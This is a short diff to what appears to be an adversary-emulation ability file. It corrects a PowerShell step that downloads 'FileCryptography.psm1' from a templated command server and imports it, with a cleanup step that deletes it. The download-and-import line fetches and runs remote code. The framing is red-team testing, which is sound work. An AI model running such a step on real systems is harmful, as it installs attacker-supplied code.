@@ -10,7 +10,7 @@
   executors:
     psh:
       command: |
-        Invoke-WebRequest -Uri #{server}/file/download -Method POST -Headers @{'file'='FileCryptography.psm1'} -OutFile FileCryptography.psm1
-        import-module FileCryptography.psm1;
+        Invoke-WebRequest -Uri #{server}/file/download -Method POST -Headers @{'file'='FileCryptography.psm1'} -OutFile FileCryptography.psm1;
+        Import-Module ./FileCryptography.psm1 -Verbose -Force;
       cleanup: |
         Remove-Item FileCryptography.psm1
